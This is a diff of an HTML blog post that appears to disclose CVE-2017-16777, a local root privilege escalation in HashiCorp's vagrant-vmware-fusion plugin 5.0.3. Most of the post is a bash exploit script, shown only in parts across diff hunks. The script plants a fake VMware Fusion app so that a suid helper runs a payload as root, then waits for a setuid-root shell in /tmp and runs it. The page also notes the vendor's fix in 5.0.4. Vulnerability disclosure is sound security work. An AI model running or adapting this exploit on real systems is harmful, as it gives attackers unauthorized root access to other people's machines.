@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,36 +23,37 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/cve201716777-local-root-privesc-in-hashicorp-vagrantvmwarefusion-503.html">CVE-2017-16777 Local root privesc in Hashicorp vagrant-vmware-fusion 5.0.3</a></h2>
                 <h3>15 Nov 2017 08:21  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                
                   <pre>Another day, another root privesc bug in this plugin. Not quite so serious this
 time - this one is only exploitable if the user has the plugin installed but
-VMware Fusion *not* installed. This is a fairly unlikely scenario but it&#39;s a
-straight to root privesc with no user interaction so isn&#39;t the kind of thing
+VMware Fusion *not* installed. This is a fairly unlikely scenario but it&#x27;s a
+straight to root privesc with no user interaction so isn&#x27;t the kind of thing
 that should be shipping with any software.
 
 This occurs because the suid root sudo helper that I have discussed in previous
 exploit writeups executes /Applications/VMware
 Fusion.app/Contents/Library/vmnet-cli
-as root, but if the application isn&#39;t installed and we&#39;re a local admin user we
+as root, but if the application isn&#x27;t installed and we&#x27;re a local admin user we
 can create a fake app directory with a payload in place of vmnet-cli that gets
 executed as root.
 
 HashiCorp fixed this (very quickly) in 5.0.4.
 
-<a href="https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt</a>
+https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt
 3c11083386b3f7352d60b327190eed4364383c0622351db5410d809f4bda746a
 ------------------------------------------------------------------------------
 #!/bin/bash
 echo
 echo &quot;#########################################################&quot;
 echo &quot;# vagrant_vmware_fusion plugin 5.0.3 local root privesc #&quot;
-echo &quot;# by m4rkw - <a href="https://m4.rkw.io/blog.html                #&quot">https://m4.rkw.io/blog.html                #&quot</a>;
+echo &quot;# by m4rkw - https://m4.rkw.io/blog.html                #&quot;
 echo &quot;#########################################################&quot;
 echo &quot;# Note: only works when VMWare Fusion is not installed. #&quot;
 echo &quot;#########################################################&quot;
@@ -61,7 +62,7 @@ echo
 cleanup() {
   exec 2&gt; /dev/null
   killall -9 vagrant 1&gt;/dev/null 2&gt;/dev/null
-  kill -9 `ps auxwww |egrep &#39;\/vagrant up$&#39; |xargs -L1 |cut -d &#39; &#39; -f2` &amp;&gt;/dev/null
+  kill -9 `ps auxwww |egrep &#x27;\/vagrant up$&#x27; |xargs -L1 |cut -d &#x27; &#x27; -f2` &amp;&gt;/dev/null
   exec 2&gt; /dev/tty
   cd
   rm -rf .vagrant_vmware_fusion_503_exp
@@ -128,8 +129,8 @@ cd .vagrant_vmware_fusion_503_exp
 echo &quot;writing dummy vagrantfile ...&quot;
 
 cat &gt; vagrantfile &lt;&lt;EOF
-Vagrant.configure(&#39;2&#39;) do |config|
-  config.vm.box = &#39;envimation/ubuntu-xenial&#39;
+Vagrant.configure(&#x27;2&#x27;) do |config|
+  config.vm.box = &#x27;envimation/ubuntu-xenial&#x27;
 end
 EOF
 
@@ -139,7 +140,7 @@ vagrant up &amp;&gt;/dev/null &amp;
 
 while :
 do
-  r=`ps auxwww |grep &#39;vagrant up&#39; |grep -v grep`
+  r=`ps auxwww |grep &#x27;vagrant up&#x27; |grep -v grep`
   if [ &quot;$r&quot; == &quot;&quot; ] ; then
     break
   fi
@@ -163,12 +164,12 @@ success=0
 
 while :
 do
-  r=`ls -la /tmp/vvp_503 |grep -- &#39;-rwsr-xr-x  1 root  wheel&#39;`
+  r=`ls -la /tmp/vvp_503 |grep -- &#x27;-rwsr-xr-x  1 root  wheel&#x27;`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
     success=1
     break
   fi
-  r=`ps auxwww |grep &#39;vagrant up&#39; |grep -v grep`
+  r=`ps auxwww |grep &#x27;vagrant up&#x27; |grep -v grep`
   if [ &quot;$r&quot; == &quot;&quot; ] ; then
     break
   fi
@@ -190,10 +191,11 @@ fi
 
 echo
 cd
-/tmp/vvp_503</pre>
+/tmp/vvp_503
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -203,39 +205,67 @@ cd
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
